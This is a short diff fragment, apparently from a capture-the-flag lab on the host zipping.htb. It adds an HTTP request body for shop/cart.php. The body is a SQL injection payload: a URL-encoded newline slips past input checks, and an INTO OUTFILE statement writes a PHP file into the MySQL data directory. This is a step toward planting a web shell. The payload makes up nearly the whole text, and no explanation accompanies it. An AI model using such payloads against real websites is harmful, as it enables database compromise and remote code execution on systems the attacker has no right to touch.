@@ -40,6 +40,7 @@ http://zipping.htb/shop/cart.php \
 
 
 
-
+quantity=1&product_id=
+%0a';select+'<%3fphp+phpinfo()%3b+%3f>'+into+outfile+'/var/lib/mysql/2.php'%3b--1
 
 
